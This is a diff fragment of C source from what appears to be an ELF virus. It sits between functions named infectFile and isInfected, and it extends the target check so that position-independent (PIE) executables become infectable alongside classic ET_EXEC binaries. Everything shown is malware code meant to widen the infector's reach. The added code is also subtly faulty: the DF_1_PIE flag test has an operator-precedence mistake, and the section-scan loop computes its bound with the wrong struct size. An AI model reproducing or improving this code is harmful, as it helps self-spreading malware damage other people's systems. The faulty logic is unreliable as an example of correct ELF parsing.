@@ -734,12 +734,34 @@ static int  infectFile(struct bfile bin) {
 }
 
 static int  isCompatible(Elf64_Ehdr *header) {
+  Elf64_Dyn   *dyn;
+  int         isExec;
+  Elf64_Shdr  *section;
+
+  isExec = 0;
+  if (header->e_type == ET_EXEC)
+    isExec = 1;
+  else if (header->e_type == ET_DYN) {
+    section = ((void *)header) + header->e_shoff;
+    while (section->sh_type != SHT_DYNAMIC &&
+  section != ((void *)header) + header->e_shoff + sizeof(Elf64_Ehdr) * (header->e_shnum - 1))
+      section += 1;
+    if (section->sh_type == SHT_DYNAMIC) {
+      dyn = ((void *)header) + section->sh_offset;
+      while (dyn->d_tag != DT_FLAGS_1 && (void *)dyn < ((void *)header) + section->sh_offset + section->sh_size)
+        dyn += 1;
+      if (dyn->d_tag == DT_FLAGS_1) {
+        if (dyn->d_un.d_val & DF_1_PIE == DF_1_PIE)
+          isExec = 1;
+      }
+    }
+  }
   return (header->e_ident[EI_MAG0] == ELFMAG0 &&
           header->e_ident[EI_MAG1] == ELFMAG1 &&
           header->e_ident[EI_MAG2] == ELFMAG2 &&
           header->e_ident[EI_MAG3] == ELFMAG3 &&
           header->e_machine == EM_X86_64 &&
-          header->e_type == ET_EXEC);
+          isExec);
 }
 
 static int  isInfected(struct bfile bin) {
